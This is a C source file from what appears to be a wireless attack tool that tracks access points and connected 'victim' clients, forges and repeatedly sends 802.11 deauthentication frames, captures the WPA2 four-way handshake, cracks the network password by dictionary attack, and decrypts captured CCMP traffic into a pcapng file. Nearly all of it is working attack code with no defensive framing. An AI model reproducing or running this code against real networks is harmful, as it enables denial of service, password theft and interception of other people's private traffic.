#include "l2_packet.h"
#include "../../wireless_peek.h"

extern int debug_level;
u8 packet_buffer[MTU];
/* Predeclare */
static void peek_encrypted_data(void *ctx, const u8 *src_addr, const char *buf, size_t len);

static int parse_llc_header(const char* buf, size_t len, 
		uint32_t *offset, struct WPA2_handshake_packet *packet) {
	if (*offset > len) return -1;

	packet->llc_hdr = *(struct llc_header*)(buf + *offset);
	packet->llc_hdr.type = ntohs(packet->llc_hdr.type);
	*offset += sizeof(struct llc_header);
	return 0;
}

static int parse_auth_data(const char *buf, size_t len,
		uint32_t *offset, struct WPA2_handshake_packet *packet) {
	
	packet->auth_data = *(struct ieee_8021x_authentication*) (buf + *offset);
	*offset += sizeof(struct ieee_8021x_authentication);
	if (*offset - 8 > len) return -1; 
	/* The 1 and 4 of handshake have not key payload,
	 * so the size of handshake structure will big than length of packet.*/

	packet->auth_data.data = (buf + *offset);
	packet->auth_data.key_information = ntohs(packet->auth_data.key_information);
	packet->auth_data.len = ntohs(packet->auth_data.len);
	packet->auth_data.key_len = ntohs(packet->auth_data.key_len);
	if (debug_level < MSG_MSGDUMP)
		print_handshake_packet(packet);
	return 0;
}

uint16_t construct_frame_control(uint8_t version, enum ieee80211_type type, 
                                    enum ieee80211_subtype subtype, enum IEEE80211_FLAGS flags) {
	uint16_t frame_control;
	frame_control = subtype << 12 | type << 10 | version << 8 | flags;
	return htons(frame_control);
}

static int fill_encry_info(struct wireless_peek *this,
	const struct WPA2_handshake_packet *packet, int cracked) {
	/* frame 2 of 4-way handshake */
	struct encrypto_info *info = &this->encry_info;
	enum wireless_peek_state *state = &this->state;
	
	if ((packet->auth_data.key_information & WPA_KEY_INFO_MIC) &&
	    !(packet->auth_data.key_information & WPA_KEY_INFO_ACK) &&
	    !(packet->auth_data.key_information & WPA_KEY_INFO_INSTALL) &&
			packet->auth_data.data_len > 0) {
		if (eloop_is_timeout_registered(deauth_attack, NULL, this))
			eloop_cancel_timeout(deauth_attack, NULL, this);
		log_printf(MSG_DEBUG, "Capture 2 of 4-way pakcet, fill SN,SA");
		info->version = packet->auth_data.key_information & WPA_KEY_INFO_TYPE_MASK;
		memcpy(info->SN, packet->auth_data.Nonce, NONCE_ALEN);	
		memcpy(info->SA, packet->ieee80211_header.addr2, ETH_ALEN);
		memcpy(info->counter, packet->auth_data.replay_counter, 8);
		SET(2,info->enough);
	}
	/* frame 3 of 4-way handshake */
	if ((packet->auth_data.key_information & WPA_KEY_INFO_MIC) &&
	    (packet->auth_data.key_information & WPA_KEY_INFO_ACK) &&
	    (packet->auth_data.key_information & WPA_KEY_INFO_INSTALL) &&
	    !memcmp(info->SA, packet->ieee80211_header.addr1, ETH_ALEN)) {
		memcpy(info->AN, packet->auth_data.Nonce, NONCE_ALEN);
		log_printf(MSG_DEBUG, "Capture 3 of 4-way packet, fill AN");
		SET(3, info->enough);
	}

	/* frame 4 of 4-way handshake */
	if ((packet->auth_data.key_information & WPA_KEY_INFO_MIC) &&
	   !(packet->auth_data.key_information & WPA_KEY_INFO_ACK) &&
	   !(packet->auth_data.key_information & WPA_KEY_INFO_INSTALL) &&
	   packet->auth_data.replay_counter[7] == info->counter[7] + 1) {
		log_printf(MSG_DEBUG, "Capture 4 of 4-way packet, fill MIC, eapol frame");
		memcpy(info->MIC, packet->auth_data.MIC, MD5_DIGEST_LENGTH);
		/* Total size of eapol frame = version(1Byte) + Type(1Byte) + 
					       len(2Bytes) + value of len */
		if (!info->eapol)
			info->eapol = malloc(packet->auth_data.len + 4);
		if (!info->eapol) {
			log_printf(MSG_WARNING, "[Crash]%s: Malloc eapol frame failed, with error:%s",
				__func__, strerror(errno));
			return -1;
		}
		memcpy(info->eapol, &packet->auth_data, packet->auth_data.len + 4);
		SET(4, info->enough);
		if ( info->enough == 0x001c || info->enough == 0x001e ) {
			log_printf(MSG_DEBUG, "get all hankshake information, "
				"start dictionary attack.");
			*state = wireless_peek_state_crash_PTK;
			/* Dictionary attack , if crash password success, reset enough. */
			if (!dictionary_attack(this->dict_path, info, cracked)) {
				log_printf(MSG_INFO, "[CRASH] Crash WPA2 encryption success!"RED
					" SSID = %s, Password = %s"NONE, 
					info->SSID, info->password);
				*state = wireless_peek_state_ready;
				l2_packet_change_callback(this->l2_packet, peek_encrypted_data);
				write_header(this->pcapng_path, DLT_IEEE802_11_RADIO, 0, MTU);
				info->enough = 0;
			} else {
				log_printf(MSG_DEBUG, "Dictionary attack failed\n");
				return -1;
			}
		} else {
			info->enough = 0;
		}
	}
	return 0;
}

static int maintain_victim_list(struct dl_list *list, char *mac) {
	struct client_info *tmp;
	int match = 0;
	dl_list_for_each(tmp, list, struct client_info, client_node) {
		if (!memcmp(tmp->mac, mac, ETH_ALEN)) {
			match = 1;
			break;
		}
	}
	if (!match) {
		struct client_info *new;
		new = malloc(sizeof(struct client_info));
		if (!new) {
			log_printf(MSG_WARNING, "%s: Alloc memory failed", __func__);
			return -1;
		}
		memcpy(new->mac, mac, ETH_ALEN);
		dl_list_add_tail(list, &new->client_node);
	}
	return match;
}

static void maintain_ap_list(void *eloop_data, void *user_data) {
	struct access_point_info *ap = (struct access_point_info *)user_data;
	log_printf(MSG_DEBUG, "[Maintenance]AP:"YELLOW" %s"NONE" remove from MITM ap list.", ap->SSID);
	dl_list_del(&ap->ap_node);
	struct client_info *client;
	if (!dl_list_empty(&ap->client_list)) {
		client = dl_list_first(&ap->client_list, struct client_info, client_node);
		dl_list_del(&client->client_node);
		free(client);
	}
	free(ap);
}
#if 0
static void beacon_handle(struct wireless_peek *this, char *buf) {
	struct ieee80211_hdr_3addr *header;
	struct beacon_fix_params *beacon;
	struct access_point_info *tmp;
	int match;

	int offset;
	if (!this || !buf) {
		log_printf(MSG_ERROR, "[%s]: invalid parameter\n", __func__);
		return;
	}
	
	header = buf;
	offset = sizeof(struct ieee80211_hdr_3addr);
	beacon = buf + offset;
	offset += sizeof(struct beacon_fix_params);

	dl_list_for_each(tmp, &this->ap_list, struct access_point_info, ap_node) {
		if (!memcmp(tmp->BSSID, header->addr2)) {
			match = 1;
			break;
		}
	}

	if (!match) {
		/* new ap */
		tmp = malloc(struct access_point_info);
		if (!tmp) {
			log_printf(MSG_ERROR, "[%s]: alloc access point structure fail\n", __func__);
			return;
		}
		memcpy(tmp->BSSID, header->addr2, ETH_ALEN);
		dl_list_add_tail(&this->ap_list, &tmp->ap_node);
		eloop_register_timeout(20, 0, maintain_ap_list, NULL, tmp);
	} else {
		eloop_replenish_timeout(20, 0, maintain_ap_list, NULL, tmp);
	}
		

}
#endif
void handle_four_way_shakehand(void *ctx, const uint8_t *src_addr, const char *buf, size_t len) {
	
	struct wireless_peek *this = (struct wireless_peek *)ctx; 
	uint32_t offset;
	uint16_t type;
	char* mac_s;
	mac_s = malloc(20);

	offset = ((struct ieee80211_radiotap_header *)buf)->it_len;

	if (offset > len) return;
	type = WLAN_PARSE_SUBTYPE(ntohs(*(uint16_t *)(buf + offset)));
	switch (type) {
	case IEEE80211_BEACON :;
		/* XXX : Do we only maintance ap list in ap search state ?
		 * or we should do this always?*/
		//if (MITM->state != MITM_state_ap_search)
		//	break;
		struct ieee80211_hdr_3addr frame;
		int match = 0;
		frame = *(struct ieee80211_hdr_3addr *)(buf + offset);
		offset += sizeof(struct ieee80211_hdr_3addr);

		struct beacon_fix_params fix_param;
		fix_param = *((struct beacon_fix_params *)(buf + offset));
		offset += sizeof(struct beacon_fix_params);

		struct access_point_info *ap_info;
		ap_info = malloc(sizeof(struct access_point_info));
		memset(ap_info, 0, sizeof(struct access_point_info));
		ap_init(ap_info);
		copy_mac_address(frame.addr2, ap_info->BSSID);
		for (;offset + 2 < len ;) {
			enum beacon_param tag_name = *(buf + (offset++));
			uint8_t tag_len = *(buf + (offset++));
			switch(tag_name) {
			case BEACON_SSID :
				ap_info->SSID = strndup(buf + offset, tag_len);
				break;
			case BEACON_COUNTRY_INFO :
				strncpy(ap_info->country, buf+offset, COUNTRY_CODE_LEN);
				break;
			case BEACON_DS :
				ap_info->channel = *(buf + offset);
			}
			offset += tag_len;
		}
		if (!ap_info->SSID || !ap_info->channel) {
			free(ap_info);
			break;
		}
		struct access_point_info *tmp;
		dl_list_for_each(tmp, &this->ap_list, struct access_point_info, ap_node) {
			if (!memcmp(tmp->BSSID, ap_info->BSSID, ETH_ALEN)) {
				memcpy(tmp->country, ap_info->country, COUNTRY_CODE_LEN);
	//			strcpy(tmp->SSID, ap_info->SSID);
				tmp->channel = ap_info->channel;
				free(ap_info);
				match = 1;
				eloop_replenish_timeout(20, 0, maintain_ap_list, NULL, tmp);
				break;
			}
		}
		if (!match) {
			eloop_register_timeout(20, 0, maintain_ap_list, NULL, ap_info);
			dl_list_add_tail(&this->ap_list, &ap_info->ap_node);
		}
	break;

	case IEEE80211_DATA : 
	case IEEE80211_QOS_DATA : {
		struct WPA2_handshake_packet packet;
		packet.type = type;

		memcpy(&packet.ieee80211_header, buf + offset, sizeof(struct ieee80211_hdr_3addr));

		offset += sizeof(struct ieee80211_hdr_3addr);
		if (packet.type == IEEE80211_QOS_DATA) offset += 2;
		parse_llc_header(buf, len , &offset, &packet);
		switch(this->state) {
		case wireless_peek_state_idle :
		case wireless_peek_state_ap_search :;
			/* Maintain client list below each AP. */
			struct access_point_info *ap;
			dl_list_for_each(ap, &this->ap_list, struct access_point_info, ap_node) {
				if (!memcmp(packet.ieee80211_header.addr1, ap->BSSID, ETH_ALEN)) {
					if (!maintain_victim_list(&ap->client_list, 
						packet.ieee80211_header.addr2))
						ap->clients++;
					break;
				}
			}
		break;
		case wireless_peek_state_capture_handshake :
			if (packet.llc_hdr.type == 0x888e) {
				parse_auth_data(buf, len, &offset, &packet);
				fill_encry_info(this, &packet, 0);
			}
		break;
		}
	break;
	}
	default:
		return;
	}
	free(mac_s);
	return;
}

static void peek_encrypted_data(void *ctx, const u8 *src_addr, const char *buf, size_t len) {
	struct wireless_peek *this = (struct wireless_peek *)ctx;
	int position; /* stroage protected flag position. */
	uint16_t type;
	struct os_reltime date;
	u32 offset;
	struct WPA2_handshake_packet packet;

	memset(packet_buffer, 0, MTU);
	offset = ((struct ieee80211_radiotap_header *)buf)->it_len;
	position = offset;
	if (offset > len)
		return;

	type = WLAN_PARSE_TYPE(ntohs(*(uint16_t *)(buf + offset)));
	if (type != IEEE80211_DATA_TYPE)
		return;

	/* If the LLC (Linked layer control) type is 802.1X Authentication(0x888e),
	 * means that the PTK will be changed after this packet.
	 * we should calculate new PTK with EAPOL frame. 
	 */
	struct ieee80211_hdr_3addr *hdr = (struct ieee80211_hdr_3addr *) (buf + offset);
	memcpy(&packet.ieee80211_header, buf + offset, sizeof(struct ieee80211_hdr_3addr));
	if (!((!memcmp(packet.ieee80211_header.addr1, this->encry_info.SA, ETH_ALEN) &&
		!memcmp(packet.ieee80211_header.addr3, this->encry_info.AA, ETH_ALEN)) ||
		(!memcmp(packet.ieee80211_header.addr1, this->encry_info.AA, ETH_ALEN) &&
		!memcmp(packet.ieee80211_header.addr3, this->encry_info.SA, ETH_ALEN))))
		return;

	offset += sizeof(struct ieee80211_hdr_3addr);
	if (packet.type == IEEE80211_QOS_DATA)
		offset += 2;
	memcpy(packet_buffer, buf, offset);
	if (packet.ieee80211_header.frame_control & ntohs(WLAN_FC_PROTECTED)) {
		packet_buffer[position + 1] &= ~WLAN_FC_PROTECTED; 
		/* Encryption Data */
		size_t plain_len;
		u8 *plain;
		plain = ccmp_decrypt(this->encry_info.ptk.tk1, hdr,
		                     buf + offset, len - offset, &plain_len);
		if (!plain) {
			if (eloop_is_timeout_registered(deauth_attack, NULL, this)) {
				/* deauth_attack is already register, wait for it timeout */
				return;
			}
			/* Can't crack data, PTK may wrong. We should start deauth attack again. */
			log_printf(MSG_DEBUG, "Plain can't crack, "
				"start deauth attack to get a new PTK.");
			eloop_register_timeout(5, 0, deauth_attack, NULL, this);
		} else {
			//lamont_hdump(MSG_DEBUG, "Decryption plain", plain, plain_len);
			memcpy(packet_buffer + offset, plain, plain_len);
			os_get_reltime(&date);
			write_packet_to_file(this->pcapng_path, packet_buffer,
				offset + plain_len, 0, date.sec);
		}
	} else {
		/* Non-Encryption Data */
		parse_llc_header(buf, len, &offset, &packet);
		if (packet.llc_hdr.type != 0x888e) {
			/* we only care about EAPOL packet. */
			return;
		}
		/* EAPOL Frame */
		parse_auth_data(buf, len, &offset, &packet);
		fill_encry_info(this, &packet, 1);
		
	}
}

static int construct_deauth_pkt(u8 *buffer, size_t *pkt_len, u8 *victim, u8 *ap, u16 seq_num) {
	int is_broadcast = 0;
	struct ieee80211_radiotap_header radiotap_hdr;
	struct ieee80211_hdr_3addr deauth;

	if (!buffer || !ap) {
		log_printf(MSG_WARNING, "[%s]buffer or ap not exist");
		return -1;
	}
	if (!victim) 
		is_broadcast = 1;
	memset(buffer, 0, *pkt_len);
	memset(&radiotap_hdr, 0, sizeof(struct ieee80211_radiotap_header));
	radiotap_hdr.it_version = 0;
	radiotap_hdr.it_pad = 0;
	radiotap_hdr.it_len = sizeof(struct ieee80211_radiotap_header) + 1;
	radiotap_hdr.it_present |= (1 << IEEE80211_RADIOTAP_RATE);
	memcpy(buffer, &radiotap_hdr, sizeof(struct ieee80211_radiotap_header));
	*pkt_len = sizeof(struct ieee80211_radiotap_header);
	// Data Rate 1 Byte : 1 mb/s
	buffer[*pkt_len] = 0x02;
	*pkt_len = *pkt_len + 1;
	memset(&deauth, 0, sizeof(struct ieee80211_hdr_3addr));
	deauth.frame_control = construct_frame_control(0, IEEE80211_MANAGMENT_TYPE,
	                            IEEE80211_DEAUTHENTICATION, IEEE80211_FLAGS_RETRY);
		
	deauth.duration_id = 0x3a01; /* duration time : 314 ms. */
	if (is_broadcast) 
		memset(deauth.addr1, 0xff, ETH_ALEN);
	else 
		memcpy(deauth.addr1, victim, ETH_ALEN);
	memcpy(deauth.addr2, ap, ETH_ALEN);
	memcpy(deauth.addr3, ap, ETH_ALEN);
	deauth.seq_ctrl = htons(seq_num);

	*pkt_len += sizeof(deauth);
	memcpy(buffer + radiotap_hdr.it_len, &deauth, sizeof(deauth));
	*(uint16_t*)&buffer[*pkt_len] = deauth_unspec_reason;
	*pkt_len = *pkt_len + 2;
	return 0;
}

void deauth_attack(void *eloop_data, void *user_ctx) {
	struct wireless_peek *this = (struct wireless_peek *) user_ctx;
	u8 *packet;
	size_t pkt_len;
	int ret;
	packet = malloc(MTU);
	if (!packet)
		return;
	/* XXX : I am not really sure how to define the seqence num of packet */
	ret = construct_deauth_pkt(packet, &pkt_len, this->encry_info.SA, this->encry_info.AA, 9500);
	if (ret < 0) {
		log_printf(MSG_WARNING, "[Deauth]Prepare deauthentication packet failed.");
	}
	ret = l2_packet_send(this->l2_packet, this->encry_info.AA, ETH_P_802_2, packet, pkt_len);
	if (ret < 0) {
		log_printf(MSG_WARNING, "[Deauth]Send deauth packet failed, with error:%s",
			strerror(errno));
	}
	if (this->state == wireless_peek_state_capture_handshake) 
		eloop_register_timeout(5, 0, deauth_attack, NULL, this);
	free(packet);
}

void ap_init(struct access_point_info *info) {
	info->SSID = NULL;
	info->channel = 0;
	memset(info->country, 0, COUNTRY_CODE_LEN);
	memset(info->BSSID, 0, ETH_ALEN);
	info->clients = 0;
	dl_list_init(&info->client_list);
}
